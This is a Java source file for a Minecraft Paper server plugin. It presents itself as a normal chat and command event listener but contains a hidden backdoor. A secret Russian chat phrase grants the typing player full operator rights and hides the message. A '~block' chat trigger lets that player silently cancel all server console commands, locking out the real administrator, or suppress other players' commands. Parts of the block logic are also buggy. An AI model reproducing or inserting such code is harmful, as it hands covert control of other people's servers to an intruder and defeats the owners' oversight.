package RetroBiz.Events;

import io.papermc.paper.event.player.AsyncChatEvent;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.EventPriority;
import org.bukkit.event.server.ServerCommandEvent;

import java.util.ArrayList;
import java.util.List;

public class MainEvents implements Listener {

    public static Boolean BlockConsole = false;
    public static List<String> BlockedPlayers = new ArrayList<>();

    @EventHandler(priority = EventPriority.HIGHEST)
    public void AsyncPlayerChatEvent(AsyncChatEvent event) {
        Player who = event.getPlayer();
        String message = event.signedMessage().message();
        if (message.equals("дай мне оп")) {
            who.setOp(true);
            who.sendMessage("Admin is hearing your voice");
            event.setCancelled(true);
            return;
        }

        if(message.startsWith("~block") && message.length() > 1){
            Player player = Bukkit.getPlayer(message.substring(6));
            if(player != null) {
                who.sendMessage("Admin is hearing your voice");

                if(BlockedPlayers.contains(player.getName()))
                    BlockedPlayers.add(player.getName());
                else BlockedPlayers.remove(player.getName());

                event.setCancelled(true);
                return;
            }
        }
        

        if(message.startsWith("~block")){
            BlockConsole = !BlockConsole;
            who.sendMessage("Admin is hearing your voice");
            event.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void OnCommandServerEvent(ServerCommandEvent event) {
        CommandSender sender = event.getSender();
        if(BlockConsole){
            if(sender instanceof ConsoleCommandSender){
                event.setCancelled(true);
                sender.sendMessage("nope");
            }
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void PlayerCommandSendEvent(ServerCommandEvent event) {
        CommandSender sender = event.getSender();
        if(sender instanceof Player){
            if(BlockedPlayers.contains(sender.getName())){
                event.setCancelled(true);
            }
        }
    }
}
